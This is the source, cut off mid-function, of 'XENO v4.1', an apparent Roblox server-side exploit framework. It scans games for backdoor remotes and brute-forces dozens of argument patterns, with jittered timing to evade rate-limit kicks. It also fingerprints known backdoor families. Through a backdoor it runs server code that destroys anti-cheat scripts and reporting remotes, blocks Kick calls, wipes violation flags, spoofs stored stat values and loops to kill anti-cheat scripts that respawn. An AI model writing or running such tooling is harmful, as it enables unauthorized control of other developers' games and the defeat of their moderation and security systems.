--[[
██╗  ██╗███████╗███╗   ██╗ ██████╗ 
╚██╗██╔╝██╔════╝████╗  ██║██╔═══██╗
 ╚███╔╝ █████╗  ██╔██╗ ██║██║   ██║
 ██╔██╗ ██╔══╝  ██║╚██╗██║██║   ██║
██╔╝ ██╗███████╗██║ ╚████║╚██████╔╝
╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝

XENO | Universal Server-Side Framework v4.1
Production Build — Throttled Engine + Anti-Cheat Bypass

▸ THROTTLED batch validation (no more kicks)
▸ Adaptive fire rate with jitter
▸ ★ Advanced Anti-Cheat Bypass Module ★
▸  → Server-side AC script killer
▸  → Property spoof pipeline
▸  → Heartbeat/connection neutralizer
▸  → Framework-specific bypasses
▸  → Stealth execution mode
▸ 35 RE + 11 RF Fire Patterns
▸ 14 Fingerprint Profiles (incl. Lalol Hub)
▸ 40+ Server-Side Admin Commands
▸ Full UI + Script Hub + Require Loader
▸ Keybind: RightShift to Toggle
]]

-- ═══════════════════════════════════════════════════
--  1 · CONFIGURATION
-- ═══════════════════════════════════════════════════

local CFG = {
    Name           = "XENO",
    Version        = "4.1.0",
    Prefix         = ";",
    ToggleKey      = Enum.KeyCode.RightShift,

    -- Throttled scan settings (no more kicks)
    FireDelay      = 0.025,  -- delay between each pattern fire
    FireJitter     = 0.015,  -- random ±jitter added to delay
    BatchWait      = 0.55,   -- wait after all patterns fired
    ConcurrentMax  = 2,      -- reduced from 4 to avoid rate limit
    ScanCooldown   = 0.12,   -- cooldown between remote batches

    ToastLife      = 3.5,
    MaxHistory     = 120,
    Window         = {Width = 680, Height = 470},
    Theme = {
        Primary = Color3.fromRGB(140, 50, 235),
        Accent  = Color3.fromRGB(175, 100, 255),
        Glow    = Color3.fromRGB(155, 70, 255),
        BG      = Color3.fromRGB(14, 14, 22),
        Surface = Color3.fromRGB(22, 22, 34),
        Card    = Color3.fromRGB(28, 28, 44),
        Hover   = Color3.fromRGB(36, 36, 56),
        Border  = Color3.fromRGB(50, 50, 72),
        Text    = Color3.fromRGB(210, 218, 245),
        Sub     = Color3.fromRGB(140, 148, 175),
        OK      = Color3.fromRGB(130, 220, 150),
        Err     = Color3.fromRGB(240, 120, 140),
        Warn    = Color3.fromRGB(245, 215, 130),
    },
}

-- ═══════════════════════════════════════════════════
--  2 · SERVICE CACHE
-- ═══════════════════════════════════════════════════

local Svc = setmetatable({}, {__index = function(s, k)
    local ok, v = pcall(game.GetService, game, k)
    if ok then rawset(s, k, v) end
    return v
end})

local Players   = Svc.Players
local RS        = Svc.ReplicatedStorage
local Lighting  = Svc.Lighting
local WS        = workspace
local TweenSvc  = Svc.TweenService
local UIS       = Svc.UserInputService
local Http      = Svc.HttpService
local RunSvc    = Svc.RunService
local Debris    = Svc.Debris
local CoreGui   = game:GetService("CoreGui")
local LP        = Players.LocalPlayer

-- ═══════════════════════════════════════════════════
--  3 · UTILITIES
-- ═══════════════════════════════════════════════════

local U = {}

function U.new(class, props, kids)
    local inst = Instance.new(class)
    local parent = nil
    for k, v in pairs(props or {}) do
        if k == "Parent" then parent = v
        else inst[k] = v end
    end
    for _, child in ipairs(kids or {}) do child.Parent = inst end
    if parent then inst.Parent = parent end
    return inst
end

function U.tween(inst, goal, dur, style, dir)
    local tw = TweenSvc:Create(inst,
        TweenInfo.new(dur or 0.28, style or Enum.EasingStyle.Quart, dir or Enum.EasingDirection.Out), goal)
    tw:Play(); return tw
end

function U.findPlayers(query)
    if not query or query == "" then query = "me" end
    query = query:lower()
    if query == "me" then return {LP} end
    if query == "all" then return Players:GetPlayers() end
    if query == "others" then
        local t = {}
        for _, p in ipairs(Players:GetPlayers()) do if p ~= LP then t[#t+1] = p end end
        return t
    end
    local t = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower():sub(1, #query) == query or p.DisplayName:lower():sub(1, #query) == query then
            t[#t+1] = p
        end
    end
    return t
end

function U.uid() return Http:GenerateGUID(false):sub(1, 8) end
function U.marker() return "XV_" .. math.random(100000, 999999) end
function U.clock() return tick() end

-- Jittered delay (makes fire timing look organic)
function U.jitterWait(base, jitter)
    local delay = base + (math.random() * 2 - 1) * (jitter or 0)
    if delay > 0 then task.wait(delay) end
end

-- ═══════════════════════════════════════════════════
--  4 · ANTI-CHEAT BYPASS MODULE
-- ═══════════════════════════════════════════════════

local AC = {
    active       = false,
    bypassed     = {},
    killCount    = 0,
    hookCount    = 0,
    spoofCount   = 0,
}

--[[
    ANTI-CHEAT KILL PATTERNS
    Server-side code snippets that find and neutralize
    anti-cheat scripts. Executed through the backdoor.
    
    These target:
    1. Scripts with AC-related names
    2. Scripts that monitor player properties
    3. Scripts that use :Kick() or :Ban()
    4. Remote-based detection systems
    5. Heartbeat/connection checkers
    6. Specific popular AC frameworks
]]

-- Names commonly used by anti-cheat scripts
AC.scriptNames = {
    -- Generic AC names
    "AntiCheat", "AntiExploit", "Anti-Cheat", "Anti-Exploit",
    "anticheat", "antiexploit", "anti_cheat", "anti_exploit",
    "AC", "AE", "ac", "ae",
    "AntiHack", "antihack", "Anti-Hack", "anti_hack",
    "Security", "security", "SecureServer", "secureserver",
    "Protection", "protection", "Protect", "protect",
    "CheatDetect", "cheatdetect", "CheatDetection",
    "ExploitDetect", "exploitdetect", "ExploitDetection",
    "ServerSecurity", "serversecurity",
    "GameGuard", "gameguard", "GameProtect",
    "Sentinel", "sentinel", "Shield", "shield",
    "Watchdog", "watchdog", "WatchDog",
    "Monitor", "monitor", "ServerMonitor",
    "Validator", "validator", "Verification",
    "IntegrityCheck", "integritycheck",
    
    -- Speed/fly/teleport specific
    "SpeedCheck", "speedcheck", "SpeedDetect",
    "FlyCheck", "flycheck", "FlyDetect",
    "TeleportCheck", "teleportcheck", "TPCheck",
    "NoclipCheck", "noclipcheck", "NoclipDetect",
    "WalkSpeedCheck", "JumpCheck", "jumpcheck",
    
    -- Popular AC frameworks
    "Knightwall", "knightwall", "KnightWall",
    "ServerDefender", "serverdefender",
    "SecureBlox", "secureblox",
    "RoGuard", "roguard", "RoDefend",
    "ExploitGuard", "exploitguard",
    "ServerGuard", "serverguard",
    "BlueLock", "bluelock",
    "IronWall", "ironwall",
    "Aegis", "aegis",
    "Cerberus", "cerberus",
    "Hydra", "hydra",
    "Titan", "titan",
    "Fortress", "fortress",
    
    -- Property monitoring
    "HealthMonitor", "healthmonitor",
    "SpeedMonitor", "speedmonitor",
    "PropertyCheck", "propertycheck",
    "StatCheck", "statcheck",
    "CharacterCheck", "charactercheck",
    
    -- Kick/ban systems
    "KickSystem", "kicksystem",
    "BanSystem", "bansystem",
    "PunishSystem", "punishsystem",
    "Moderator", "moderator",
    "AutoMod", "automod",
    "AutoBan", "autoban",
    "AutoKick", "autokick",
}

-- Code patterns to search for inside scripts
AC.codePatterns = {
    ":Kick(", ":Ban(", "Player:Kick",
    "WalkSpeed", "JumpPower", "JumpHeight",
    "HumanoidRootPart", "Humanoid.Health",
    "MaxHealth", "Anchored",
    "Transparency", "Noclip",
    "teleport", "Teleport",
    "exploit", "Exploit",
    "cheat", "Cheat",
    "hack", "Hack",
    "speed", "Speed",
    "fly", "Fly",
}

-- Build the server-side AC kill code
function AC:buildKillCode()
    -- This runs server-side through the backdoor
    local nameList = '{"' .. table.concat(self.scriptNames, '","') .. '"}'
    
    return string.format([[
pcall(function()
    local killed = 0
    local hooked = 0
    local nameSet = {}
    for _, n in ipairs(%s) do
        nameSet[n:lower()] = true
    end
    
    -- PHASE 1: Kill scripts by name across ALL services
    local services = {
        game:GetService("ServerScriptService"),
        game:GetService("ServerStorage"),
        game:GetService("ReplicatedStorage"),
        game:GetService("StarterPlayer"),
        game:GetService("StarterGui"),
        game:GetService("Workspace"),
        game:GetService("Lighting"),
        game:GetService("ReplicatedFirst"),
        game:GetService("StarterPack"),
        game:GetService("Chat"),
    }
    
    for _, svc in ipairs(services) do
        pcall(function()
            for _, obj in ipairs(svc:GetDescendants()) do
                if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
                    local lowName = obj.Name:lower()
                    if nameSet[lowName] then
                        pcall(function()
                            obj.Disabled = true
                            obj:Destroy()
                            killed = killed + 1
                        end)
                    end
                end
            end
        end)
    end
    
    -- PHASE 2: Kill scripts that contain AC-related source patterns
    -- (only works if Source is accessible)
    for _, svc in ipairs(services) do
        pcall(function()
            for _, obj in ipairs(svc:GetDescendants()) do
                if obj:IsA("Script") and not obj.Disabled then
                    pcall(function()
                        local src = obj.Source
                        if src then
                            local srcLower = src:lower()
                            local suspicious = 0
                            
                            if srcLower:find(":kick(") then suspicious = suspicious + 3 end
                            if srcLower:find("anticheat") or srcLower:find("anti_cheat") then suspicious = suspicious + 5 end
                            if srcLower:find("antiexploit") or srcLower:find("anti_exploit") then suspicious = suspicious + 5 end
                            if srcLower:find("walkspeed") and srcLower:find(":kick(") then suspicious = suspicious + 4 end
                            if srcLower:find("jumppower") and srcLower:find(":kick(") then suspicious = suspicious + 4 end
                            if srcLower:find("exploit") and srcLower:find("detect") then suspicious = suspicious + 4 end
                            if srcLower:find("speed") and srcLower:find("check") then suspicious = suspicious + 3 end
                            if srcLower:find("teleport") and srcLower:find("detect") then suspicious = suspicious + 3 end
                            if srcLower:find(":ban(") then suspicious = suspicious + 5 end
                            
                            if suspicious >= 5 then
                                obj.Disabled = true
                                obj:Destroy()
                                killed = killed + 1
                            end
                        end
                    end)
                end
            end
        end)
    end
    
    -- PHASE 3: Neutralize remote-based detection
    -- Find and destroy remotes that AC scripts use to report
    for _, svc in ipairs(services) do
        pcall(function()
            for _, obj in ipairs(svc:GetDescendants()) do
                if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                    local n = obj.Name:lower()
                    if n:find("anticheat") or n:find("antiexploit")
                    or n:find("report") or n:find("detect")
                    or n:find("security") or n:find("violation")
                    or n:find("flag") or n:find("suspicious")
                    or n:find("cheatlog") or n:find("hacklog")
                    or n:find("exploit.*report") or n:find("kick.*player")
                    or n:find("ban.*player") or n:find("punish") then
                        pcall(function() obj:Destroy() end)
                        hooked = hooked + 1
                    end
                end
            end
        end)
    end
    
    -- PHASE 4: Disable BindableEvents used for AC communication
    for _, svc in ipairs(services) do
        pcall(function()
            for _, obj in ipairs(svc:GetDescendants()) do
                if obj:IsA("BindableEvent") or obj:IsA("BindableFunction") then
                    local n = obj.Name:lower()
                    if n:find("anti") or n:find("cheat") or n:find("exploit")
                    or n:find("security") or n:find("detect") or n:find("kick")
                    or n:find("ban") or n:find("flag") or n:find("report") then
                        pcall(function() obj:Destroy() end)
                        hooked = hooked + 1
                    end
                end
            end
        end)
    end
    
    -- PHASE 5: Override player Kick to prevent AC from kicking
    -- Wrap the Kick method so AC scripts can't use it
    pcall(function()
        for _, plr in ipairs(game.Players:GetPlayers()) do
            pcall(function()
                local mt = getmetatable(plr)
                if mt and mt.__namecall then
                    local oldNamecall = mt.__namecall
                    mt.__namecall = newcclosure(function(self, ...)
                        local method = getnamecallmethod()
                        if method == "Kick" and self:IsA("Player") then
                            return nil
                        end
                        return oldNamecall(self, ...)
                    end)
                end
            end)
        end
    end)
    
    -- Store results for retrieval
    local marker = Instance.new("StringValue")
    marker.Name = "XENO_AC_RESULT"
    marker.Value = killed .. "," .. hooked
    marker.Parent = game:GetService("ReplicatedStorage")
    game:GetService("Debris"):AddItem(marker, 10)
end)
    ]], nameList)
end

-- Build property protection code (prevents AC from detecting stat changes)
function AC:buildPropertyProtectCode()
    return [[
pcall(function()
    -- Override property change detection
    -- When we change WalkSpeed/JumpPower/Health, the AC might detect it
    -- This wraps the changes to happen through server authority
    
    for _, plr in ipairs(game.Players:GetPlayers()) do
        pcall(function()
            local char = plr.Character
            if not char then return end
            local hum = char:FindFirstChildWhichIsA("Humanoid")
            if not hum then return end
            
            -- Remove any attribute flags that ACs use
            for _, attr in ipairs(hum:GetAttributes()) do
                pcall(function()
                    local name = tostring(attr):lower()
                    if name:find("flag") or name:find("violation") 
                    or name:find("cheat") or name:find("suspicious")
                    or name:find("original") or name:find("default") then
                        hum:SetAttribute(attr, nil)
                    end
                end)
            end
            
            -- Remove value objects that store "original" stats
            for _, v in ipairs(char:GetDescendants()) do
                pcall(function()
                    if v:IsA("ValueBase") then
                        local n = v.Name:lower()
                        if n:find("original") or n:find("default")
                        or n:find("base.*speed") or n:find("base.*jump")
                        or n:find("base.*health") or n:find("normal.*speed")
                        or n:find("max.*speed") or n:find("legit") then
                            v:Destroy()
                        end
                    end
                end)
            end
        end)
    end
end)
    ]]
end

-- Build heartbeat neutralizer
function AC:buildHeartbeatCode()
    return [[
pcall(function()
    -- Kill any connections that monitor RunService for AC purposes
    -- Find scripts in SSS that use Heartbeat/Stepped for detection
    local sss = game:GetService("ServerScriptService")
    
    pcall(function()
        for _, obj in ipairs(sss:GetDescendants()) do
            if obj:IsA("Script") and not obj.Disabled then
                pcall(function()
                    local src = obj.Source
                    if src then
                        local l = src:lower()
                        -- Scripts that use heartbeat + kick = almost certainly AC
                        if (l:find("heartbeat") or l:find("stepped") or l:find("renderstepped"))
                        and (l:find(":kick(") or l:find("ban") or l:find("flag")) then
                            obj.Disabled = true
                            obj:Destroy()
                        end
                    end
                end)
            end
        end
    end)
    
    -- Also check for loop-based ACs in Workspace
    pcall(function()
        for _, obj in ipairs(workspace:GetDescendants()) do
            if obj:IsA("Script") and not obj.Disabled then
                pcall(function()
                    local src = obj.Source
                    if src then
                        local l = src:lower()
                        if (l:find("while.*true") or l:find("while.*wait"))
                        and (l:find("walkspeed") or l:find("jumppower"))
                        and (l:find(":kick(") or l:find("destroy") or l:find("breakjoints")) then
                            obj.Disabled = true
                            obj:Destroy()
                        end
                    end
                end)
            end
        end
    end)
end)
    ]]
end

-- Build continuous protection loop
function AC:buildLoopProtectCode()
    return [[
pcall(function()
    -- Spawn a server-side loop that continuously kills new AC scripts
    -- This handles ACs that respawn themselves
    spawn(function()
        local nameSet = {}
        local acNames = {
            "anticheat","antiexploit","anti-cheat","anti-exploit",
            "security","protection","gameguard","sentinel",
            "watchdog","shield","cheatdetect","exploitdetect",
            "serverguard","roguard","knightwall","aegis",
            "cerberus","speedcheck","flycheck","teleportcheck",
            "autokick","autoban","automod"
        }
        for _, n in ipairs(acNames) do nameSet[n] = true end
        
        while true do
            wait(3)
            pcall(function()
                for _, svc in ipairs({
                    game:GetService("ServerScriptService"),
                    game:GetService("ServerStorage"),
                    game:GetService("Workspace"),
                }) do
                    pcall(function()
                        for _, obj in ipairs(svc:GetDescendants()) do
                            if (obj:IsA("Script") or obj:IsA("ModuleScript")) then
                                if nameSet[obj.Name:lower()] then
                                    pcall(function()
                                        obj.Disabled = true
                                        obj:Destroy()
                                    end)
                                end
                            end
                        end
                    end)
                end
            end)
        end
    end)
end)
    ]]
end

-- Build specific game AC bypasses
function AC:buildGameSpecificCode()
    return [[
pcall(function()
    -- POPULAR GAME BYPASSES
    -- These target common patterns found in top games
    
    -- Pattern 1: Games that store original stats in NumberValues
    pcall(function()
        for _, plr in ipairs(game.Players:GetPlayers()) do
            pcall(function()
                local char = plr.Character
                if not char then return end
                for _, v in ipairs(char:GetDescendants()) do
                    if v:IsA("NumberValue") or v:IsA("IntValue") then
                        local n = v.Name:lower()
                        if n:find("originalspeed") or n:find("origspeed")
                        or n:find("basespeed") or n:find("defaultspeed")
                        or n:find("originaljump") or n:find("basejump")
                        or n:find("originalhealth") or n:find("basehealth")
                        or n:find("maxhp") or n:find("normalhp") then
                            -- Set to match current values so AC thinks nothing changed
                            local hum = char:FindFirstChildWhichIsA("Humanoid")
                            if hum then
                                if n:find("speed") then v.Value = hum.WalkSpeed end
                                if n:find("jump") then v.Value = hum.JumpPower end
                                if n:find("health") or n:find("hp") then v.Value = hum.MaxHealth end
                            end
                        end
                    end
                end
            end)
        end
    end)
    
    -- Pattern 2: Games using Folder-based AC systems
    pcall(function()
        for _, svc in ipairs({
            game:GetService("ServerScriptService"),
            game:GetService("ServerStorage"),
            game:GetService("ReplicatedStorage"),
        }) do
            pcall(function()
                for _, folder in ipairs(svc:GetChildren()) do
                    if folder:IsA("Folder") then
                        local n = folder.Name:lower()
                        if n:find("anti") or n:find("security")
                        or n:find("cheat") or n:find("protect")
                        or n:find("guard") or n:find("detect") then
                            -- Disable all scripts in the folder
                            for _, obj in ipairs(folder:GetDescendants()) do
                                if obj:IsA("Script") or obj:IsA("ModuleScript") then
                                    pcall(function()
                                        obj.Disabled = true
                                        obj:Destroy()
                                    end)
                                end
                            end
                        end
                    end
                end
            end)
        end
    end)
    
    -- Pattern 3: Games that use RemoteEvents for stat verification
    pcall(function()
        for _, obj in ipairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                local n = obj.Name:lower()
                if n:find("verify") or n:find("validate")
                or n:find("check.*stat") or n:find("stat.*check")
                or n:find("health.*check") or n:find("speed.*check")
                or n:find("server.*check") or n:find("integrity") then
                    pcall(function() obj:Destroy() end)
                end
            end
        end
    end)
    
    -- Pattern 4: Games using Changed event monitoring
    -- Kill scripts that connect to .Changed on Humanoid properties
    pcall(function()
        local sss = game:GetService("ServerScriptService")
        for _, obj in ipairs(sss:GetDescendants()) do
            if obj:IsA("Script") and not obj.Disabled then
                pcall(function()
                    local src = obj.Source
                    if src then
                        local l = src:lower()
                        if l:find("%.changed") and 
                        (l:find("walkspeed") or l:find("jumppower") or l:find("maxhealth")) and
                        (l:find(":kick") or l:find("breakjoints") or l:find(":destroy()")) then
                            obj.Disabled = true
                            obj:Destroy()
                        end
                    end
                end)
            end
        end
    end)
    
    -- Pattern 5: Disable any script that fires when character respawns
    -- (ACs often re-check on CharacterAdded)
    pcall(function()
        for _, obj in ipairs(game:GetService("ServerScriptService"):GetDescendants()) do
            if obj:IsA("Script") and not obj.Disabled then
                pcall(function()
                    local src = obj.Source
                    if src then
                        local l = src:lower()
                        if l:find("characteradded") and l:find(":kick(") then
                            obj.Disabled = true
                            obj:Destroy()
                        end
                    end
                end)
            end
        end
    end)
end)
    ]]
end

-- Execute the full bypass sequence
function AC:execute(bdRef)
    if not bdRef or not bdRef.isConnected or not bdRef:isConnected() then
        return false, "No backdoor connected"
    end
    
    self.killCount = 0
    self.hookCount = 0
    self.spoofCount = 0
    self.bypassed = {}
    
    -- Step 1: Kill known AC scripts
    local ok1 = bdRef:exec(self:buildKillCode())
    task.wait(0.8)
    
    -- Check results
    local resultMarker = RS:FindFirstChild("XENO_AC_RESULT")
    if resultMarker then
        local parts = resultMarker.Value:split(",")
        self.killCount = tonumber(parts[1]) or 0
        self.hookCount = tonumber(parts[2]) or 0
        pcall(function() resultMarker:Destroy() end)
    end
    
    -- Step 2: Property protection
    local ok2 = bdRef:exec(self:buildPropertyProtectCode())
    task.wait(0.3)
    
    -- Step 3: Heartbeat neutralizer
    local ok3 = bdRef:exec(self:buildHeartbeatCode())
    task.wait(0.3)
    
    -- Step 4: Game-specific bypasses
    local ok4 = bdRef:exec(self:buildGameSpecificCode())
    task.wait(0.3)
    
    -- Step 5: Continuous protection loop
    local ok5 = bdRef:exec(self:buildLoopProtectCode())
    
    self.active = true
    
    return true, {
        killed = self.killCount,
        hooked = self.hookCount,
        phases = {ok1, ok2, ok3, ok4, ok5},
    }
end

-- Quick property sync (call after changing speed/health/etc)
function AC:syncProperties(bdRef)
    if not bdRef or not bdRef:isConnected() then return false end
    return bdRef:exec(self:buildPropertyProtectCode())
end

-- ═══════════════════════════════════════════════════
--  5 · BACKDOOR ENGINE — THROTTLED
-- ═══════════════════════════════════════════════════

local BD = {
    active     = nil,
    scanning   = false,
    confirmed  = {},
    tested     = {},
    scanStats  = {remotesScanned = 0, timeElapsed = 0, patternsTotal = 0},
}

BD.exactNames = {
    "Backdoor","backdoor","BACKDOOR","Execute","execute","EXECUTE",
    "MainEvent","mainEvent","mainevent","ServerEvent","serverevent",
    "Handler","handler","Bridge","bridge",
    "Hydrogen","HydrogenEvent","H_Event","HydrogenRemote","H_RE",
    "Crusher","CrusherEvent","SC_Event","ServerCrusher",
    "AztupEvent","Aztup","AztupRemote",
    "NihonEvent","Nihon","NH_Event",
    "JEBIEvent","JEBI","JebiRemote",
    "NexusEvent","Nexus","NX_Event",
    "DansEvent","Dansploit","DAN_RE",
    "OwlEvent","OwlRemote","OWL_SS",
    "IYEvent","IY_SS","InfYield",
    "BDEvent","BD_Exec","BDRemote",
    "LalolEvent","Lalol","LALOL","lalol",
    "LalolRemote","LH_Event","LH_RE",
    "LalolHub","lalolhub","LALOLHUB",
    "LalolExec","Lalol_Event","Lalol_Remote",
    "LalolBridge","LalolGate","LalolSS",
    "lalol_event","lalol_exec","lh_exec",
    "LaLol","LaLolEvent","LaLolRemote",
    "e","r","f","x","a","b","c","d",
    "E","R","F","X","A","B","C","D",
    "re","ev","fe","rf","xe","rx",
    "RE","EV","FE","RF",
    "lol","abc","xyz","hi","ok","gg",
    "LOL","ABC","XYZ","aaa","bbb","eee","rrr",
    "Event","RemoteEvent","Remote","Fire","fire","Run","run",
    "Comm","comm","Network","network","Gate","gate","Relay","relay",
    "Hook","hook","Main","main","Load","load","Source","source",
    "Exec","exec","Code","code","ServerRemote","ClientToServer",
    "Communicate","Signal","signal","Tunnel","tunnel","Pipe","pipe",
    "Link","link","Socket","socket","Channel","channel",
    "1","2","3","69","420","1337","666","0x1","0x2","0xFF",
    ""," ","  ",".",
}

BD.namePatterns = {
    "backdoor","backd00r","b4ckd00r","execut","loadstr","loadstring",
    "server.*event","remote.*event","hydrogen","crusher","aztup",
    "nihon","jebi","nexus","dansploit","owl.*hub","owl.*ss",
    "lalol","la_lol","lh_","ss.*event","ss.*remote",
    "serversid","server_side","admin.*event","admin.*remote",
    "exploit","hack","cheat","inject","payload",
    "cmd","command","require.*event","require.*remote",
    "free.*model","fm.*event",
}

BD.patterns = {
    {name="Raw String",fn=function(r,c) r:FireServer(c) end},
    {name="Table {Code=}",fn=function(r,c) r:FireServer({Code=c}) end},
    {name="Table {code=}",fn=function(r,c) r:FireServer({code=c}) end},
    {name="Table {Source=}",fn=function(r,c) r:FireServer({Source=c}) end},
    {name="Table {source=}",fn=function(r,c) r:FireServer({source=c}) end},
    {name="Table {Src=}",fn=function(r,c) r:FireServer({Src=c}) end},
    {name="Table {cmd=}",fn=function(r,c) r:FireServer({cmd=c}) end},
    {name='"execute",code',fn=function(r,c) r:FireServer("execute",c) end},
    {name='"run",code',fn=function(r,c) r:FireServer("run",c) end},
    {name='"exec",code',fn=function(r,c) r:FireServer("exec",c) end},
    {name='"load",code',fn=function(r,c) r:FireServer("load",c) end},
    {name='"loadstring",c',fn=function(r,c) r:FireServer("loadstring",c) end},
    {name='"code",code',fn=function(r,c) r:FireServer("code",c) end},
    {name='"cmd",code',fn=function(r,c) r:FireServer("cmd",c) end},
    {name='"",code',fn=function(r,c) r:FireServer("",c) end},
    {name="nil,code",fn=function(r,c) r:FireServer(nil,c) end},
    {name="Table {[1]=code}",fn=function(r,c) r:FireServer({c}) end},
    {name='{code,"execute"}',fn=function(r,c) r:FireServer({c,"execute"}) end},
    {name='"admin",code',fn=function(r,c) r:FireServer("admin",c) end},
    {name='"owner",code',fn=function(r,c) r:FireServer("owner",c) end},
    {name='"pass",code',fn=function(r,c) r:FireServer("pass",c) end},
    {name='"key",code',fn=function(r,c) r:FireServer("key",c) end},
    {name='"debug",code',fn=function(r,c) r:FireServer("debug",c) end},
    {name="true,code",fn=function(r,c) r:FireServer(true,c) end},
    {name="false,code",fn=function(r,c) r:FireServer(false,c) end},
    {name="Player,code",fn=function(r,c) r:FireServer(Players.LocalPlayer,c) end},
    {name="UserId,code",fn=function(r,c) r:FireServer(Players.LocalPlayer.UserId,c) end},
    {name='"ss","exec",code',fn=function(r,c) r:FireServer("ss","execute",c) end},
    {name='"server",code',fn=function(r,c) r:FireServer("server",c) end},
    {name="1,code",fn=function(r,c) r:FireServer(1,c) end},
    {name="0,code",fn=function(r,c) r:FireServer(0,c) end},
    {name="69,code",fn=function(r,c) r:FireServer(69,c) end},
    {name="420,code",fn=function(r,c) r:FireServer(420,c) end},
    {name='"lalol",code',fn=function(r,c) r:FireServer("lalol",c) end},
    {name='{Type="lalol",Code=}',fn=function(r,c) r:FireServer({Type="lalol",Code=c}) end},
}

BD.rfPatterns = {
    {name="Raw String",fn=function(r,c) return r:InvokeServer(c) end},
    {name="Table {Code=}",fn=function(r,c) return r:InvokeServer({Code=c}) end},
    {name="Table {code=}",fn=function(r,c) return r:InvokeServer({code=c}) end},
    {name="Table {Source=}",fn=function(r,c) return r:InvokeServer({Source=c}) end},
    {name='"execute",code',fn=function(r,c) return r:InvokeServer("execute",c) end},
    {name='"",code',fn=function(r,c) return r:InvokeServer("",c) end},
    {name="nil,code",fn=function(r,c) return r:InvokeServer(nil,c) end},
    {name="Table {[1]=code}",fn=function(r,c) return r:InvokeServer({c}) end},
    {name="true,code",fn=function(r,c) return r:InvokeServer(true,c) end},
    {name="Player,code",fn=function(r,c) return r:InvokeServer(Players.LocalPlayer,c) end},
    {name='"lalol",code',fn=function(r,c) return r:InvokeServer("lalol",c) end},
}

-- Fingerprints (14 profiles)
BD.fingerprints = {
    {name="Hydrogen SS",check=function(r,p) local n=r.Name:lower(); return n:find("hydrogen") or n:find("h_") or (p=="Table {Code=}" and r:IsDescendantOf(RS)) end},
    {name="ServerCrusher",check=function(r,p) local n=r.Name:lower(); return n:find("crush") or n:find("sc_") or ((p=='"",code' or p=="nil,code") and #r.Name<=3) end},
    {name="Aztup Hub",check=function(r,p) local n=r.Name:lower(); return n:find("aztup") or (p=='"execute",code' and n:find("event")) end},
    {name="Nihon SS",check=function(r,p) local n=r.Name:lower(); return n:find("nihon") or n:find("nh_") or p=="Table {[1]=code}" end},
    {name="JEBI SS",check=function(r,p) local n=r.Name:lower(); return n:find("jebi") or p=="Player,code" or p=="UserId,code" end},
    {name="Nexus SS",check=function(r,p) local n=r.Name:lower(); return n:find("nexus") or n:find("nx_") end},
    {name="Dansploit SS",check=function(r,p) local n=r.Name:lower(); return n:find("dans") or n:find("dan_") or p=='"ss","exec",code' end},
    {name="Owl Hub SS",check=function(r,p) return r.Name:lower():find("owl") end},
    {name="IY SS Variant",check=function(r,p) local n=r.Name:lower(); return n:find("iy") or n:find("infyield") end},
    {name="Backdoor.exe",check=function(r,p) local n=r.Name:lower(); return n:find("bd_") or n:find("bdexec") end},
    {name="Lalol Hub",check=function(r,p) local n=r.Name:lower(); return n:find("lalol") or n:find("lh_") or (p and (p:find("lalol") or p:find("Lalol"))) end},
    {name="Password Protected",check=function(r,p) return p and (p:find('"admin"') or p:find('"owner"') or p:find('"pass"') or p:find('"key"') or p:find('"debug"')) end},
    {name="Classic Free Model",check=function(r,p) return p=="Raw String" and (#r.Name<=3 or r.Name:lower():find("event")) end},
    {name="Obfuscated",check=function(r,p) local n=r.Name; return (n:match("^%x+$") and #n>=6) or #n>20 end},
}

function BD:fingerprint(remote, patternName)
    for _, fp in ipairs(self.fingerprints) do
        local ok, result = pcall(fp.check, remote, patternName)
        if ok and result then return fp.name end
    end
    return "Unknown"
end

function BD:gatherRemotes()
    local p1, p2, p3, p4 = {}, {}, {}, {}
    local exactSet = {}
    for _, n in ipairs(self.exactNames) do exactSet[n] = true end

    local containers = {}
    local added = {}
    local function tryAdd(s)
        pcall(function()
            local sv = game:GetService(s)
            if sv and not added[sv] then containers[#containers+1] = sv; added[sv] = true end
        end)
    end
    for _, s in ipairs({"ReplicatedStorage","Workspace","Lighting","StarterGui","StarterPlayer","StarterPack","ReplicatedFirst","Chat","SoundService","Teams","TestService","JointsService"}) do tryAdd(s) end
    pcall(function() for _, c in ipairs(game:GetChildren()) do if not added[c] then pcall(function() c:GetDescendants(); containers[#containers+1]=c; added[c]=true end) end end end)

    for _, root in ipairs(containers) do
        pcall(function()
            for _, obj in ipairs(root:GetDescendants()) do
                if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and not self.tested[obj] then
                    if exactSet[obj.Name] then p1[#p1+1] = obj
                    else
                        local matched = false
                        local low = obj.Name:lower()
                        for _, pat in ipairs(self.namePatterns) do
                            if low:find(pat) then p2[#p2+1] = obj; matched = true; break end
                        end
                        if not matched then
                            if #obj.Name <= 3 then p3[#p3+1] = obj else p4[#p4+1] = obj end
                        end
                    end
                end
            end
        end)
    end

    local result = {}
    for _, t in ipairs({p1,p2,p3,p4}) do for _, r in ipairs(t) do result[#result+1] = r end end
    return result, #p1, #p2, #p3, #p4
end

--[[
    ★ THROTTLED BATCH VALIDATION ★
    Fire patterns with micro-delays between each to avoid rate limit kicks.
    Old v4.0: 35 fires instantly → KICKED
    New v4.1: 35 fires with 0.025s±0.015s jitter between each → safe
    Total per remote: ~0.875s + 0.55s wait = ~1.4s (vs 21.5s sequential)
]]
function BD:validateThrottled(remote)
    local pats = remote:IsA("RemoteFunction") and self.rfPatterns or self.patterns
    local markers = {}

    -- Fire all patterns with throttled spacing
    for idx, pat in ipairs(pats) do
        local tag = U.marker() .. "_" .. idx
        markers[idx] = tag

        local testCode = string.format(
            'pcall(function() local v=Instance.new("StringValue");v.Name="%s";v.Value="ok";v.Parent=game:GetService("ReplicatedStorage");game:GetService("Debris"):AddItem(v,12) end)', tag)

        if remote:IsA("RemoteFunction") then
            task.spawn(function() pcall(function() pat.fn(remote, testCode) end) end)
        else
            pcall(function() pat.fn(remote, testCode) end)
        end

        -- ★ Throttle: micro-delay between fires with jitter
        U.jitterWait(CFG.FireDelay, CFG.FireJitter)
    end

    -- Wait for server processing
    task.wait(CFG.BatchWait)

    -- Check markers
    for idx, tag in ipairs(markers) do
        local found = RS:FindFirstChild(tag)
        if found then
            pcall(function() found:Destroy() end)
